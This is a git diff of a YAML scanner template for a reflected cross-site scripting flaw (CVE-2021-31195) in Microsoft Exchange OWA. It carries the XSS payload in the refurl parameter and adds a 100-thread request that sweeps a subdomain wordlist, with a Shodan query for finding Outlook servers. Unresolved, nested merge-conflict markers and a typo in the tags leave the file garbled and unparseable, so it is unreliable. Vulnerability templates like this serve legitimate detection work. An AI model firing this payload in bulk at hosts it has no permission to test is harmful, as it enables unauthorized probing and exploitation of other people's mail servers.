@@ -1,13 +1,18 @@
 <<<<<<< HEAD
+<<<<<<< HEAD
 id: CVE-2021-31195
+=======
+id: ms-exchange-server-reflected-xss
+>>>>>>> 18ddf72b (add new stuff)
 
 info:
-  name: Microsoft Exchange Server - Cross-Site Scripting
+  name: MS Exchange Server XSS
   author: infosecsanyam
-  severity: high
-  description: Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter of frowny.asp.
+  severity: medium
   reference:
+    - https://www.shodan.io/search?query=http.title%3A%22Outlook%22
     - https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
+<<<<<<< HEAD
     - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195
     - https://nvd.nist.gov/vuln/detail/CVE-2021-31195
     - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-31195
@@ -30,12 +35,23 @@ info:
     - https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
 >>>>>>> 5d36d276 (add new stuff)
   tags: microsoft,exchange,owa,xss
+=======
+  tags: miscrsoft,exchange,owa,xss
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//'
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)// HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
@@ -51,9 +67,13 @@ requests:
       - type: word
         words:
           - "text/html"
+<<<<<<< HEAD
         part: header
 <<<<<<< HEAD
 
 # Enhanced by cs 09/23/2022
 =======
 >>>>>>> 5d36d276 (add new stuff)
+=======
+        part: header
+>>>>>>> 18ddf72b (add new stuff)
